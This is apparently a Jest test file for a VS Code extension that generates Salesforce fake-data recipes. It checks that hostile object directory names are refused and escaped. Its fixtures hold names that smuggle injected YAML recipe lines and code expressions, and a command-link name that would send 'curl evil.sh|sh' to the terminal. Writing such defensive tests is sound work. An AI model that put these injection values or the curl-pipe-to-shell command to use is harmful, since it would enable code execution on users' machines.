import * as fs from 'fs';
import * as os from 'os';
import * as path from 'path';
import * as yaml from 'js-yaml';

import * as matchers from 'jest-extended';
expect.extend(matchers);

/*
    #164. An object's name is its DIRECTORY name, and on Linux and macOS a directory name can carry a
    line break. Generate Treecipe's real pipeline runs over directories whose names carry \n, \r and
    U+2028 followed by recipe lines of their own, beside two ordinary objects -- one of which has a
    lookup whose <referenceTo> carries the same payload, the other way an object name enters the walk.

    The fixture is built at run time in a temporary directory rather than committed: a file name with
    a line break cannot be checked out on every platform git supports.

    vscode is replaced by a read-only stand-in over the real file system, as in
    DirectoryProcessor.hostileFieldApiNames.test.ts.
*/
jest.mock('vscode', () => {
    const realFs = jest.requireActual('fs');
    const realPath = jest.requireActual('path');
    const toUri = (fsPath: string) => ({ fsPath: fsPath, path: fsPath });
    return {
        workspace: {
            workspaceFolders: undefined,
            fs: {
                readDirectory: async (directoryUri: { fsPath: string }) => {
                    try {
                        return realFs.readdirSync(directoryUri.fsPath, { withFileTypes: true })
                            .map((entry: { name: string; isDirectory: () => boolean }) => [entry.name, entry.isDirectory() ? 2 : 1]);
                    } catch {
                        return [];
                    }
                },
                readFile: async (fileUri: { fsPath: string }) => realFs.readFileSync(fileUri.fsPath)
            }
        },
        Uri: {
            file: toUri,
            parse: (uriText: string) => toUri(uriText.replace(/^file:\/\//, '')),
            joinPath: (baseUri: { fsPath: string }, ...segments: string[]) => toUri(realPath.join(baseUri.fsPath, ...segments))
        },
        window: { showWarningMessage: jest.fn(), showInformationMessage: jest.fn(), showErrorMessage: jest.fn() },
        FileType: { Directory: 2, File: 1, SymbolicLink: 64 },
        ThemeIcon: jest.fn()
    };
}, { virtual: true });

import * as vscode from 'vscode';
import { ConfigurationService } from '../../ConfigurationService/ConfigurationService';
import { DirectoryProcessor } from '../DirectoryProcessor';
import { GlobalValueSetSingleton } from '../../GlobalValueSetSingleton/GlobalValueSetSingleton';
import { ObjectInfoWrapper } from '../../ObjectInfoWrapper/ObjectInfoWrapper';
import { RecipeFileOutput } from '../../RelationshipService/RelationshipService';
import { IRecipeFakerService } from '../../RecipeFakerService.ts/IRecipeFakerService';
import { FakerJSRecipeFakerService } from '../../RecipeFakerService.ts/FakerJSRecipeFakerService/FakerJSRecipeFakerService';
import { SnowfakeryRecipeFakerService } from '../../RecipeFakerService.ts/SnowfakeryRecipeFakerService/SnowfakeryRecipeFakerService';
import { FakerJSRecipeProcessor } from '../../FakerRecipeProcessor/FakerJSRecipeProcessor/FakerJSRecipeProcessor';
import { INJECTED_FIELD_API_NAME, INJECTION_MARKER } from '../../RecipeFakerService.ts/RecipeYamlScalar/tests/mocks/HostilePicklistValues';
import { PythonTestHarness } from '../../RecipeFakerService.ts/RecipeYamlScalar/tests/mocks/PythonTestHarness';

const INJECTED_OBJECT_API_NAME = 'Injected__c';
const INJECTED_RECIPE_LINES = `- object: ${INJECTED_OBJECT_API_NAME}\n  fields:\n    ${INJECTED_FIELD_API_NAME}: \${{ globalThis.${INJECTION_MARKER} = true }}\n#`;
// VS CODE RENDERS THIS IN A NOTIFICATION AS A LINK THAT RUNS THE COMMAND; IT HAS NO "/", SO IT IS A VALID DIRECTORY NAME
const COMMAND_LINK_NAME = '[Regenerate now](command:workbench.action.terminal.sendSequence?%7B%22text%22%3A%22curl%20evil.sh%7Csh%5Cn%22%7D)';
const NOTIFICATION_LINK_PATTERN = /\[[^\]]*\]\([^)]*\)/;
const HOSTILE_OBJECT_DIRECTORY_NAMES = [
    `EvilLineFeed\n${INJECTED_RECIPE_LINES}`,
    `EvilCarriageReturn\r${INJECTED_RECIPE_LINES.replace(/\n/g, '\r')}`,
    `EvilLineSeparator\u2028${INJECTED_RECIPE_LINES.replace(/\n/g, '\u2028')}`,
    COMMAND_LINK_NAME
];
const HOSTILE_REFERENCE_TO = `EvilParent\n${INJECTED_RECIPE_LINES}`;
const HOSTILE_REFERENCE_TO_XML = HOSTILE_REFERENCE_TO.replace(/&/g, '&amp;').replace(/</g, '&lt;').replace(/>/g, '&gt;').replace(/\n/g, '&#10;');
const ORDINARY_OBJECT_API_NAMES = ['Account', 'ns__Thing__c'];
const EVERY_LINE_BREAK = /\r\n|\r|\n|\u0085|\u2028|\u2029/;

type LoadedRecipeEntry = { object?: string, nickname?: string, fields?: Record<string, unknown>, friends?: LoadedRecipeEntry[] };

const buildFieldXml = (fieldApiName: string, fieldType: string, referenceToXml?: string): string =>
`<?xml version="1.0" encoding="UTF-8"?>
<CustomField xmlns="http://soap.sforce.com/2006/04/metadata">
    <fullName>${fieldApiName}</fullName>
    <label>${fieldApiName}</label>
${referenceToXml ? `    <referenceTo>${referenceToXml}</referenceTo>\n` : ''}${fieldType === 'Text' ? '    <length>80</length>\n' : ''}    <type>${fieldType}</type>
</CustomField>
`;

function writeObject(objectsPath: string, objectDirectoryName: string, fieldXmlByFileName: Record<string, string>): void {

    const fieldsPath = path.join(objectsPath, objectDirectoryName, 'fields');
    fs.mkdirSync(fieldsPath, { recursive: true });
    Object.entries(fieldXmlByFileName).forEach(([fileName, fieldXml]) => fs.writeFileSync(path.join(fieldsPath, fileName), fieldXml));

}

function writeMetadata(metadataPath: string, includeHostileNames: boolean): void {

    const objectsPath = path.join(metadataPath, 'objects');
    fs.mkdirSync(path.join(metadataPath, 'globalValueSets'), { recursive: true });
    writeObject(objectsPath, 'Account', { 'Ordinary__c.field-meta.xml': buildFieldXml('Ordinary__c', 'Text') });

    // THE SECOND LOOKUP IS IN BOTH FIXTURES, SO ITS RECIPE LINE IS TOO -- ONLY ITS <referenceTo> DIFFERS
    const thingFieldXmlByFileName: Record<string, string> = {
        'Ordinary__c.field-meta.xml': buildFieldXml('Ordinary__c', 'Text'),
        'AccountLookup__c.field-meta.xml': buildFieldXml('AccountLookup__c', 'Lookup', 'Account'),
        'SecondLookup__c.field-meta.xml': includeHostileNames
            ? buildFieldXml('SecondLookup__c', 'Lookup', HOSTILE_REFERENCE_TO_XML)
            : buildFieldXml('SecondLookup__c', 'Lookup')
    };
    if ( includeHostileNames ) {
        HOSTILE_OBJECT_DIRECTORY_NAMES.forEach(hostileObjectDirectoryName => {
            writeObject(objectsPath, hostileObjectDirectoryName, { 'Ordinary__c.field-meta.xml': buildFieldXml('Ordinary__c', 'Text') });
        });
    }
    writeObject(objectsPath, 'ns__Thing__c', thingFieldXmlByFileName);

}

function mockConfiguration(createFakerService: () => IRecipeFakerService) {

    jest.spyOn(ConfigurationService, 'getFakerImplementationByExtensionConfigSelection').mockImplementation(createFakerService);
    jest.spyOn(ConfigurationService, 'getCustomRelationshipMappings').mockReturnValue({});
    jest.spyOn(ConfigurationService, 'getCustomCompoundAddressFields').mockReturnValue([]);

}

async function generate(metadataPath: string, createFakerService: () => IRecipeFakerService): Promise<ObjectInfoWrapper> {

    mockConfiguration(createFakerService);
    await GlobalValueSetSingleton.getInstance().initialize(metadataPath);
    return new DirectoryProcessor().processAllObjectsAndRelationships(vscode.Uri.file(path.join(metadataPath, 'objects')));

}

// EVERY ENTRY AT EVERY DEPTH, PARENTS BEFORE THEIR FRIENDS -- A faker-js RECIPE NESTS CHILD OBJECTS UNDER friends: (#46)
const flattenRecipeEntries = (recipeEntries: LoadedRecipeEntry[]): LoadedRecipeEntry[] =>
    recipeEntries.flatMap(recipeEntry => [recipeEntry, ...flattenRecipeEntries(recipeEntry.friends ?? [])]);

const recipeEntriesOf = (recipeFiles: RecipeFileOutput[]): LoadedRecipeEntry[] =>
    recipeFiles.flatMap(recipeFile => flattenRecipeEntries(yaml.load(recipeFile.content) as LoadedRecipeEntry[]));

// A DIRECTORY NAME WITH A LINE BREAK CANNOT EXIST ON WINDOWS, WHICH IS ALSO WHY THE ATTACK DOES NOT
const describeWherePossible = process.platform === 'win32' ? describe.skip : describe;
const testRequiringPyYaml = PythonTestHarness.testRequiringModules('yaml');

let hostileMetadataPath: string;
let ordinaryMetadataPath: string;

beforeAll(() => {
    hostileMetadataPath = fs.mkdtempSync(path.join(os.tmpdir(), 'treecipe-hostile-object-name-'));
    ordinaryMetadataPath = fs.mkdtempSync(path.join(os.tmpdir(), 'treecipe-ordinary-object-name-'));
    if ( process.platform !== 'win32' ) {
        writeMetadata(hostileMetadataPath, true);
    }
    writeMetadata(ordinaryMetadataPath, false);
});

afterAll(() => {
    fs.rmSync(hostileMetadataPath, { recursive: true, force: true });
    fs.rmSync(ordinaryMetadataPath, { recursive: true, force: true });
});

afterEach(() => {
    delete (globalThis as Record<string, unknown>)[INJECTION_MARKER];
});

describeWherePossible('the hostile object name fixture', () => {

    test('holds a directory for each hostile name, exactly as written', () => {

        const objectDirectoryNames = fs.readdirSync(path.join(hostileMetadataPath, 'objects')).sort();

        expect(objectDirectoryNames).toEqual([...ORDINARY_OBJECT_API_NAMES, ...HOSTILE_OBJECT_DIRECTORY_NAMES].sort());

    });

});

describeWherePossible.each([
    ['faker-js', () => new FakerJSRecipeFakerService()],
    ['snowfakery', () => new SnowfakeryRecipeFakerService()]
] as const)('Generate Treecipe with the %s backend, over hostile object names', (unusedBackend, createFakerService) => {

    let objectInfoWrapper: ObjectInfoWrapper;

    beforeAll(async () => {
        (vscode.window.showWarningMessage as jest.Mock).mockClear();
        objectInfoWrapper = await generate(hostileMetadataPath, createFakerService);
    });

    test('keeps every refused name out of the objects wrapper, its relationships and its recipe files', () => {

        expect(Object.keys(objectInfoWrapper.ObjectToObjectInfoMap).sort()).toEqual(ORDINARY_OBJECT_API_NAMES);
        expect(objectInfoWrapper.ObjectToObjectInfoMap['ns__Thing__c'].RelationshipDetail.parentObjectToFieldReferences).toEqual({ Account: ['AccountLookup__c'] });
        expect(objectInfoWrapper.SkippedObjectApiNames.sort()).toEqual([...HOSTILE_OBJECT_DIRECTORY_NAMES, HOSTILE_REFERENCE_TO].sort());
        objectInfoWrapper.RecipeFiles.forEach(recipeFile => {
            expect(recipeFile.objects).toEqual(ORDINARY_OBJECT_API_NAMES);
        });

    });

    test('writes only the ordinary objects, and no line names the injected object or field', () => {

        const recipeEntries = recipeEntriesOf(objectInfoWrapper.RecipeFiles);

        expect(recipeEntries.map(recipeEntry => recipeEntry.object)).toEqual(ORDINARY_OBJECT_API_NAMES);
        expect(recipeEntries.map(recipeEntry => recipeEntry.nickname)).toEqual(ORDINARY_OBJECT_API_NAMES.map(objectApiName => `${objectApiName}_NickName`));
        objectInfoWrapper.RecipeFiles.forEach(recipeFile => {
            recipeFile.content.split(EVERY_LINE_BREAK).forEach(recipeLine => {
                expect(recipeLine).not.toContain(INJECTED_OBJECT_API_NAME);
                expect(recipeLine).not.toContain(INJECTED_FIELD_API_NAME);
            });
        });

    });

    test('names every refused object once, escaped, in a single warning', () => {

        const warningMessages = (vscode.window.showWarningMessage as jest.Mock).mock.calls
            .map(warningCall => warningCall[0] as string)
            .filter(warningMessage => warningMessage.includes('object name'));

        expect(warningMessages).toHaveLength(1);
        expect(warningMessages[0]).not.toMatch(EVERY_LINE_BREAK);
        expect(warningMessages[0]).toContain('"EvilLineFeed\\n- object: Injected__c');
        expect(warningMessages[0]).toContain('"EvilCarriageReturn\\r- object: Injected__c');
        expect(warningMessages[0]).toContain('"EvilLineSeparator\\u2028- object: Injected__c');
        expect(warningMessages[0]).toContain('"EvilParent\\n- object: Injected__c');
        expect(warningMessages[0]).toContain('"\\u005bRegenerate now\\u005d\\u0028command:');
        expect(warningMessages[0]).not.toMatch(NOTIFICATION_LINK_PATTERN);

    });

    /*
        A field's own metadata is kept as it was read, as #120 keeps a refused field api name: the
        wrapper is JSON, so a line break in it is escaped data, and the Recipe Cockpit lists objects
        by their map KEYS. What must hold is that no object, relationship, tree or recipe file is
        named by a refused name.
    */
    test('names no object in the serialized objects wrapper the Recipe Cockpit reads by a refused name', () => {

        const serializedObjectInfoWrapper = JSON.parse(JSON.stringify(objectInfoWrapper));
        const fieldsByObjectApiName = Object.values(serializedObjectInfoWrapper.ObjectToObjectInfoMap)
            .map((serializedObjectInfo: Record<string, unknown>) => {
                const { Fields: unusedFields, ...everythingButFields } = serializedObjectInfo;
                return everythingButFields;
            });

        expect(Object.keys(serializedObjectInfoWrapper.ObjectToObjectInfoMap).sort()).toEqual(ORDINARY_OBJECT_API_NAMES);
        expect(JSON.stringify(fieldsByObjectApiName)).not.toContain(INJECTED_OBJECT_API_NAME);
        expect(JSON.stringify(serializedObjectInfoWrapper.RelationshipTrees)).not.toContain(INJECTED_OBJECT_API_NAME);
        expect(JSON.stringify(serializedObjectInfoWrapper.RecipeFiles)).not.toContain(INJECTED_OBJECT_API_NAME);

    });

    test('writes each ordinary object byte-identically to a run without the hostile names beside it', async () => {

        const hostileRecipeContents = objectInfoWrapper.RecipeFiles.map(recipeFile => recipeFile.content);
        const ordinaryObjectInfoWrapper = await generate(ordinaryMetadataPath, createFakerService);

        ORDINARY_OBJECT_API_NAMES.forEach(objectApiName => {
            expect(objectInfoWrapper.ObjectToObjectInfoMap[objectApiName].FullRecipe).toBe(ordinaryObjectInfoWrapper.ObjectToObjectInfoMap[objectApiName].FullRecipe);
        });
        expect(objectInfoWrapper.ObjectToObjectInfoMap['ns__Thing__c'].FullRecipe).toStartWith('\n- object: ns__Thing__c\n  nickname: ns__Thing__c_NickName\n  count: 1\n  fields:\n');
        expect(hostileRecipeContents).toEqual(ordinaryObjectInfoWrapper.RecipeFiles.map(recipeFile => recipeFile.content));

    });

    testRequiringPyYaml('every recipe file loads with PyYAML exactly as js-yaml loads it', () => {

        const recipeTexts = objectInfoWrapper.RecipeFiles.map(recipeFile => recipeFile.content);

        expect(PythonTestHarness.loadWithPyYaml(recipeTexts)).toEqual(recipeTexts.map(recipeText => yaml.load(recipeText)));

    });

});

describeWherePossible('Run Faker by Recipe with faker-js over hostile object names', () => {

    let recipeDirectoryPath: string;

    beforeAll(() => {
        recipeDirectoryPath = fs.mkdtempSync(path.join(os.tmpdir(), 'treecipe-hostile-object-name-recipe-'));
    });

    afterAll(() => {
        fs.rmSync(recipeDirectoryPath, { recursive: true, force: true });
    });

    test('generates only the ordinary objects and never evaluates an injected expression', async () => {

        const objectInfoWrapper = await generate(hostileMetadataPath, () => new FakerJSRecipeFakerService());
        const generatedObjectApiNames: string[] = [];

        for ( const recipeFile of objectInfoWrapper.RecipeFiles ) {

            const recipeFilePath = path.join(recipeDirectoryPath, recipeFile.fileName);
            fs.writeFileSync(recipeFilePath, recipeFile.content);
            const generatedRecords = JSON.parse(await new FakerJSRecipeProcessor().generateFakeDataBySelectedRecipeFile(recipeFilePath)) as Array<{ object: string }>;
            generatedObjectApiNames.push(...generatedRecords.map(generatedRecord => generatedRecord.object));

        }

        expect(globalThis).not.toHaveProperty(INJECTION_MARKER);
        expect(generatedObjectApiNames).toEqual(ORDINARY_OBJECT_API_NAMES);

    });

});

describe('Generate Treecipe over ordinary object names', () => {

    test('refuses nothing, warns about nothing and serializes no skipped list', async () => {

        (vscode.window.showWarningMessage as jest.Mock).mockClear();
        const objectInfoWrapper = await generate(ordinaryMetadataPath, () => new FakerJSRecipeFakerService());

        expect(Object.keys(objectInfoWrapper.ObjectToObjectInfoMap).sort()).toEqual(ORDINARY_OBJECT_API_NAMES);
        expect(objectInfoWrapper).not.toHaveProperty('SkippedObjectApiNames');
        expect(vscode.window.showWarningMessage).not.toHaveBeenCalled();

    });

});

describe('DirectoryProcessor.escapeForNotification', () => {

    test.each([
        ['a command link', COMMAND_LINK_NAME],
        ['a link split by a line break', '[a]\n(command:x)'],
        ['a nested link', '[[a](command:x)](command:y)']
    ])('leaves no link VS Code would render in %s', (unusedDescription, hostileName) => {

        const escapedName = DirectoryProcessor.escapeForNotification(hostileName);

        expect(escapedName).not.toMatch(NOTIFICATION_LINK_PATTERN);
        expect(escapedName).not.toMatch(/[[\]()]/);
        expect(escapedName).not.toMatch(EVERY_LINE_BREAK);

    });

    test('leaves an ordinary name as it is', () => {

        expect(DirectoryProcessor.escapeForNotification('ns__Thing__c')).toBe('ns__Thing__c');

    });

});

describe('DirectoryProcessor.warnOfSkippedObjectApiNames', () => {

    test('lists at most the first twenty names and counts the rest', () => {

        mockConfiguration(() => new FakerJSRecipeFakerService());
        const showWarningMessage = vscode.window.showWarningMessage as jest.Mock;
        showWarningMessage.mockClear();
        const objectInfoWrapper = new ObjectInfoWrapper();
        Array.from({ length: 25 }, (unusedValue, index) => `Bad Name ${index}`).forEach(name => objectInfoWrapper.addKeyToObjectInfoMap(name));

        new DirectoryProcessor().warnOfSkippedObjectApiNames(objectInfoWrapper);

        expect(showWarningMessage).toHaveBeenCalledTimes(1);
        const warningMessage = showWarningMessage.mock.calls[0][0] as string;
        expect(warningMessage).toContain('skipped 25 object name(s)');
        expect(warningMessage).toContain('"Bad Name 19"');
        expect(warningMessage).not.toContain('"Bad Name 20"');
        expect(warningMessage).toContain(' and 5 more.');

    });

    test('warns about nothing when nothing was refused', () => {

        mockConfiguration(() => new FakerJSRecipeFakerService());
        const showWarningMessage = vscode.window.showWarningMessage as jest.Mock;
        showWarningMessage.mockClear();

        new DirectoryProcessor().warnOfSkippedObjectApiNames(new ObjectInfoWrapper());

        expect(showWarningMessage).not.toHaveBeenCalled();

    });

});
